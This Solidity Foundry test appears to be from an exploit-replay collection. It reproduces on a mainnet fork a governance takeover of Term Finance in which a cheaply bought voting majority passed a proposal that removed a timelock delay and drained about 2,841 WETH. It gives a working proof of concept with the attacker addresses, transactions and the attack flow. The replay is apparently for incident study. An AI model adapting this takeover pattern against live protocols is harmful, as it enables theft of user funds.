// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$8.5M (2,841.74 WETH + ~1.68M USDC/DAI)
// Attacker EOA (tx #1) : 0xa908b3472d76e7744baB0A5911768a4a6300612B
// Attacker EOA (tx #2) : 0x686457a7468B9B31c5dbA43b1b16077B48520691
// Governor / proposal proxy : 0x64E477800051EFb06Ae4086f4b258b270668b4dF
// Governor impl (unverified) : 0x3e30DDF30172F54C50cB490fF56E10f1a4737cF1
// TokenVoting : 0x213771693A4411446b4ECce5bce4a405778b2171
// gtmvETH vote token : 0x5b96c5bBdcB361E1E9944bAa071b237E27829Be0
// Yearn V3 ETH Meta Vault : 0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2
// Zodiac Delay : 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33
// Attacker Aragon module : 0x0ae12AF3878a2d896f5C4DCE3Be7250FB187c0a6
// WETH exit strategy : 0x184f2E57b4cE135181FA2A2166AC394339016338
// Attack tx #1 : https://etherscan.io/tx/0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129
// Attack tx #2 : https://etherscan.io/tx/0x9f273f9a5a20c2fc957b06bbfa45db486390eede4a7f44fbe1a2eb6744c2e8a0
// Propose / vote : https://etherscan.io/tx/0x284fc544f39c21388e17ca9669970dda9fe0f31921c38676f56073573f73a8b8
// Alert : https://x.com/DefimonAlerts/status/2091422624249217259
//
// @Analysis
// Cheap majority of gtmvETH (wrapped tmvETH; ~0.535 supply) let the attacker pass
// proposal #5. executeProposal() zeros Zodiac Delay txCooldown (608400 → 0),
// enables an attacker module, then update_debt-withdraws Yearn/Morpho/Aave WETH
// into a hardcoded-recipient exit strategy (~2,841.74 WETH).
// This PoC replays tx #1 at the pre-execution block (25816048).

address constant ATTACKER = 0xa908b3472d76e7744baB0A5911768a4a6300612B;
address constant GOVERNOR = 0x64E477800051EFb06Ae4086f4b258b270668b4dF;
address constant GOVERNOR_IMPL = 0x3e30DDF30172F54C50cB490fF56E10f1a4737cF1;
address constant TOKEN_VOTING = 0x213771693A4411446b4ECce5bce4a405778b2171;
address constant GTMV_ETH = 0x5b96c5bBdcB361E1E9944bAa071b237E27829Be0;
address constant ETH_META_VAULT = 0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2;
address constant DELAY = 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33;
address constant ATTACKER_MODULE = 0x0ae12AF3878a2d896f5C4DCE3Be7250FB187c0a6;
address constant WETH_EXIT = 0x184f2E57b4cE135181FA2A2166AC394339016338;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant PROTOCOL_SAFE = 0x46DA347d1Db6EdCA62BF6Cd5892Dc284fC938613;

// executeProposal mined in block 25816049
uint256 constant FORK_BLOCK = 25_816_048;
// Live tx #1 credited 2_841_743_535_791_961_701_401 wei (one extra block of yield).
uint256 constant EXPECTED_WETH = 2_841_743_517_563_533_112_109;

interface IExecuteProposal {
    function executeProposal() external;
}

contract TermFinanceGovernanceTakeover_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = WETH;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(GOVERNOR, "GovernorProxy");
        vm.label(GOVERNOR_IMPL, "GovernorImpl");
        vm.label(TOKEN_VOTING, "TokenVoting");
        vm.label(GTMV_ETH, "gtmvETH");
        vm.label(ETH_META_VAULT, "ETH Meta Vault");
        vm.label(DELAY, "ZodiacDelay");
        vm.label(ATTACKER_MODULE, "AttackerModule");
        vm.label(WETH_EXIT, "WETHExitStrategy");
        vm.label(WETH, "WETH");
        vm.label(PROTOCOL_SAFE, "ProtocolSafe");

        uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);
        require(wethBefore == 0, "attacker already funded");

        vm.startPrank(ATTACKER, ATTACKER);
        IExecuteProposal(GOVERNOR).executeProposal();
        vm.stopPrank();

        uint256 profit = IERC20(WETH).balanceOf(ATTACKER) - wethBefore;
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);
        require(profit >= EXPECTED_WETH, "WETH short");
    }
}
